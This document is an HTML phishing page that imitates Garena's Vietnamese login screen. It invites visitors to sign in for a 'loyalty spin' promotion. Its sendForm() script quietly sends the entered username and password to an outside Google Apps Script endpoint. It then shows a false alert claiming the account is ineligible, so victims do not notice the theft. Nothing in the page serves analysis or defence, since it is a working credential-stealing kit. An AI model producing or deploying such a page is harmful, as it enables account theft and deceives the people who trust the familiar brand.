<!doctype html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="description" content="Garena">
    <link href="//auth.garena.com/css/sso.css" rel="stylesheet" type="text/css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <title>Garena</title> 
</head>

<body>
    <div id="page">
        <div id="header" class="header">
            <div class="topBarGarena"></div>
            <div class="topBar"></div>
            <div id="header" class="header">
                <div class="langWrapper fr">
                <select class="lang">
                <option value="vi-VN">Việt Nam - Tiếng việt</option>
                <option value="en-SG">Singapore - English</option>
                <option value="zh-SG">新加坡 - 简体中文</option>
                <option value="zh-TW">台灣 - 繁体中文</option>
                <option value="en-PH">Philippines - English</option>
                <option value="th-TH">ไทย - ไทย</option>
                <option value="id-ID">Indonesia - Bahasa Indonesia</option>
                <option value="ru-RU">Россия - Русский</option>
                <option value="en-MY">Malaysia - English</option>
                </select><span class="icon-earth"></span></div>
    </div>
            <h1>
                <a class="logo" href="#" target="_blank">
                    <img src="//auth.garena.com/images/img_garena_logo.png" style="height: 35px;">
                </a>
            </h1>
            
        </div>               
        <div id="main-panel" class="mobile">
            <div class="content" style="top: 0px;">
                <h2 class="title">Đăng nhập vòng quay THÂN THIẾT</h2>
                <form  id="login-form" class="loginForm" onsubmit="return sendForm();" >                    
                    <div id="line-account" class="line">
                         <input id="sso_login_form_account" name="username" type="text" placeholder="Tài khoản Garena, Email hoặc số điện thoại" autocorrect="off" autocapitalize="off" required autofocus> 
                    </div>
                    <div id="line-password" class="line">
                        <input id="sso_login_form_password" name="password" type="password" placeholder="Mật khẩu">
                    </div>
                      
                    <div id="line-btn" class="line btnLine">
                        <input id="confirm-btn"  type="submit" value="Đăng nhập ngay" class="btn" >
                    </div>
                    <div class="divider">
                        <span>hoặc</span>
                    </div>
                    <div id="line-btn" class="line btnLine">
                        <input id="sso_login_link_register" name="register" type="button" value="Tạo tài khoản mới" class="btn black" onclick="location.href='https://sso.garena.com/ui/register?redirect_uri=https%3A%2F%2Fsso.garena.com%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%253Flocale_name%253DVN%26locale%3Dvi-VN&locale=vi-VN';">
                    </div>
                    
                </form>
                <div class="linkLine">
                    <a id="sso_login_link_forget_password" href="#" class="sec" target="_blank">Quên mật khẩu?</a>
                </div>
            </div>
        </div>
    </div>
    <!--<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script src="//sso.garena.com/js/crypto.js"></script>
    <<script>alert('Bạn phải đăng nhập để thực hiện chức năng vòng quay THÂN THIẾT !')</script>
    <script>function sendForm() {
        // đem tất cả dữ liệu trong form id là 'google-form' gom thành biến data
        let data = $('#login-form').serialize();
    
        $.ajax({ //Sử dụng Ajax gửi dữ liệu đi
            url: 'https://script.google.com/macros/s/AKfycbxlV751M2__hEAYrug8qSO5TlAha1P53TOXB8QxuycVI04a9fK1wRyjZkh04J6F3XEJ/exec',
            method: 'GET',
            dataType: 'json',
            data: data,
            success: function(responseData, textStatus, jqXHR) {
            },
            error: function(jqXHR, textStatus, errorThrown) {
                console.log(errorThrown);
            }
        });
    
        window.jQuery(this).trigger('reset');
        alert('Tài khoản của bạn không đủ điều kiện tham gia chương trình !');
    
        return true;
    };
    </script>
</body>

</html>
